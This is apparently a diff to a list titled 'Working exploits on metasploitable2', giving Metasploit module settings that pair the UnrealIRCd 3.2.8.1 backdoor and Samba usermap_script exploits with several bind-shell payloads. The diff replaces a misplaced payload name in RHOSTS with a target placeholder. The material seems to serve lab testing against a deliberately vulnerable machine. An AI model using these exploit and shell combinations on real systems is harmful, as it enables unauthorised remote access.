@@ -600,10 +600,10 @@ Working exploits on metasploitable2
 4)
  "name": "unix/irc/unreal_ircd_3281_backdoor",
     "payloads": {
-        "cmd/unix/bind_perl": {}
+        "payload/cmd/unix/bind_ruby": {}
     },
     "options": {
-        "RHOSTS": "payload/cmd/unix/bind_ruby"
+        "RHOSTS": "<target_host>"
     }    
 
 5)
@@ -612,7 +612,7 @@ Working exploits on metasploitable2
         "cmd/unix/bind_ruby_ipv6": {}
     },
     "options": {
-        "RHOSTS": "payload/cmd/unix/bind_ruby"
+        "RHOSTS": "<target_host>"
     }
 6)
 "name": "exploit/multi/samba/usermap_script",
@@ -620,7 +620,7 @@ Working exploits on metasploitable2
         "payload/cmd/unix/bind_awk": {}
     },
     "options": {
-        "RHOSTS": "payload/cmd/unix/bind_ruby"
+        "RHOSTS": "<target_host>"
     }
 7)
 "name": "exploit/multi/samba/usermap_script",
@@ -628,7 +628,7 @@ Working exploits on metasploitable2
         "payload/cmd/unix/bind_busybox_telnetd": {}
     },
     "options": {
-        "RHOSTS": "payload/cmd/unix/bind_ruby"
+        "RHOSTS": "<target_host>"
     }   
 8)
 "name": "exploit/multi/samba/usermap_script",
@@ -636,7 +636,7 @@ Working exploits on metasploitable2
         "payload/cmd/unix/bind_inetd": {}
     },
     "options": {
-        "RHOSTS": "payload/cmd/unix/bind_ruby"
+        "RHOSTS": "<target_host>"
     }
 9)
 "name": "exploit/multi/samba/usermap_script",
@@ -644,7 +644,7 @@ Working exploits on metasploitable2
         "payload/cmd/unix/bind_lua": {}
     },
     "options": {
-        "RHOSTS": "payload/cmd/unix/bind_ruby"
+        "RHOSTS": "<target_host>"
     }       
 10)
 "name": "exploit/multi/samba/usermap_script",
@@ -652,7 +652,7 @@ Working exploits on metasploitable2
         "payload/cmd/unix/bind_jjs": {}
     },
     "options": {
-        "RHOSTS": "payload/cmd/unix/bind_ruby"
+        "RHOSTS": "<target_host>"
     }   
 
 """
